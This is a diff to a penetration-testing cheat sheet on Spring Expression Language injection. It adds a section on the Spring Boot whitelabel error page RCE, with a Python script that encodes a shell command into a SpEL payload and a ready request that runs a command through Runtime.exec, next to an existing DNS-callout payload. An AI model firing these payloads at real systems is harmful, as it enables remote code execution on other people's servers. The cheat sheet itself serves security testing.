@@ -107,11 +107,9 @@ If you have access to a source code, try to search for vulnerable code using the
 - `SpelExpressionParser`, `EvaluationContext`, `parseExpression`, `@Value("#{ <expression string> }")`
 - `#{ <expression string> }`, `${<property>}`, `T(<javaclass>)`
 
-If a source code is not available, it is worth checking the `metrics` and `beans` endpoints provided by the Spring Boot actuators.
+If a source code is not available, it is worth checking the `metrics` and `beans` endpoints provided by the Spring Boot actuators. These endpoints can expand the list of available beans and the parameters they accept.
 
 {% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}
-
-These endpoints can expand the list of available beans and the parameters they accept.
 
 Additionally, try to use expressions in different elements of the service:
 
@@ -136,7 +134,47 @@ new java.lang.ProcessBuilder({'dig <URL>'}).start()
 ${user.name}
 ```
 
-## ReDoS
+# Spring boot whitelabel error page RCE
+
+This vulnerability requires the following conditions:
+
+- Spring Boot version `1.1.0 - 1.1.12`, `1.2.0 - 1.2.7`, `1.3.0`
+- There is at least one interface that triggers the default whitelabel error page in Spring Boot
+
+Check the next Spring Boot application: [LandGrey/springboot-spel-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce). If you send a request to `/article?id=hop`, the application will return a whitelabel error with code `500`. However, if you send a request to `/article?id=${7*7}`, the application returns an error page with the calculated value `49`. It happens because:
+
+1. Spring Boot processes URL parameters in errors with the `org.springframework.util.PropertyPlaceholderHelper` class
+2. `PropertyPlaceholderHelper.parseStringValue` method parses URL parameters
+3. Content enclosed in `${}` will be parsed and executed as a SpEL expression by the `resolvePlaceholder` method of `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` class
+
+As a result, it leads to RCE and you can execute arbitrary commands using the following steps:
+
+1. Prepare the payload with the next python scrypt (this sample prepares a payload that executes `open -a Calculator` command):
+
+    ```python
+    cmd = 'open -a Calculator'
+
+    h = ''
+    for x in cmd:
+        h += hex(ord(x)) + ','
+    
+    payload = h.rstrip(',')
+
+    print('${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{' + payload + '}))}')
+    ```
+
+2. Send the payload within the `id` parameter:
+
+    ```http
+    /article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+    ```
+
+3. `open -a Calculator` will be executed
+
+References:
+- [Spring Boot Vulnerability Exploit Check List: whitelabel error page SpEL RCE](https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce)
+
+# SimpleEvaluationContext ReDoS
 
 The `SimpleEvaluationContext` context prevents arbitrary code executing and writes a error message. However, you still can exploit the ReDoS attack.
 
